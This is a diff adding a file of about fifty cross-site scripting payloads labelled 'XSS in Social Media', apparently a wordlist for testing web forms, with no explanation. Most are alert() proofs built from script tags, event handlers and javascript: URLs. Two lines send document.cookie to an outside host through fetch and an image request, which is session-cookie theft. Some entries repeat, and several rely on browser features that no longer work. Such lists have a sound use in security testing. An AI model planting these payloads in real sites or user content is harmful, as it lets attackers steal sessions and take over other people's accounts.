@@ -1,0 +1,50 @@
+<script>alert('XSS in Social Media')</script>
+<img src="x" onerror="alert('XSS in Social Media')">
+<a href="javascript:alert('XSS in Social Media')">Click me</a>
+<div onmouseover="alert('XSS in Social Media')">Hover over me</div>
+<script>eval('alert("XSS in Social Media")')</script>
+<input type="text" value="<script>alert('XSS in Social Media')</script>">
+<iframe src="javascript:alert('XSS in Social Media');"></iframe>
+<svg/onload=alert('XSS in Social Media')>
+<script>document.location='javascript:alert("XSS in Social Media")'</script>
+<script>window.location="javascript:alert('XSS in Social Media')"</script>
+<form action="javascript:alert('XSS in Social Media')"></form>
+<img src="invalid" onerror="alert('XSS in Social Media')">
+<input type="button" value="Click me" onclick="alert('XSS in Social Media')">
+<button onclick="alert('XSS in Social Media')">Click me</button>
+<textarea onfocus="alert('XSS in Social Media')"></textarea>
+<input type="text" value="<img src=x onerror=alert('XSS in Social Media')>">
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS in Social Media')">
+<object data="javascript:alert('XSS in Social Media')"></object>
+<audio src="javascript:alert('XSS in Social Media')"></audio>
+<input type="image" src="x" onerror="alert('XSS in Social Media')">
+<script>setTimeout('alert("XSS in Social Media")', 100)</script>
+<script>window.alert('XSS in Social Media');</script>
+<input type="file" onchange="alert('XSS in Social Media')">
+<script>fetch('http://example.com?cookie=' + document.cookie)</script>
+<div style="width: expression(alert('XSS in Social Media'));">
+<script>window.alert(document.cookie)</script>
+<script>document.cookie="SocialMediaXSS=" + encodeURIComponent('test');</script>
+<script>new Image().src='javascript:alert("XSS in Social Media")'</script>
+<script>document.body.innerHTML = '<img src=x onerror=alert("XSS in Social Media")>';</script>
+<script>var img = new Image(); img.src = "http://example.com?cookie=" + document.cookie;</script>
+<script>document.body.innerHTML = '<iframe src="javascript:alert(\'XSS in Social Media\')"></iframe>';</script>
+<input onfocus="alert('XSS in Social Media')" autofocus>
+<video onplay="alert('XSS in Social Media')"></video>
+<form action="javascript:alert('XSS in Social Media')" method="POST"></form>
+<a href="javascript:document.location='javascript:alert(1)'">Go to Page</a>
+<textarea onblur="alert('XSS in Social Media')"></textarea>
+<script>var x = document.createElement('script'); x.src = 'javascript:alert("XSS in Social Media")'; document.body.appendChild(x);</script>
+<script>eval('alert("XSS in Social Media")')</script>
+<input type="text" value="SocialMedia <img src='x' onerror='alert(1)'>">
+<script>eval('alert(document.cookie)')</script>
+<img src="x" onerror="this.src='http://example.com/evil.jpg'">
+<style>@import 'javascript:alert(2)';</style>
+<button onclick="location='javascript:alert(3)'">Click Me</button>
+<form action="javascript:alert('XSS in Social Media')" method="POST"></form>
+<audio controls autoplay><source src="javascript:alert('XSS in Social Media')"></audio>
+<script>document.body.innerHTML = '<img src="x" onerror="alert(\'XSS\')">';</script>
+<script>location='javascript:alert("XSS in Social Media")'</script>
+<script>window.location="javascript:alert('XSS in Social Media')"</script>
+<input type="text" value="<svg><script>alert('XSS in Social Media')</script></svg>">
+<script>window.alert('XSS in Social Media')</script>
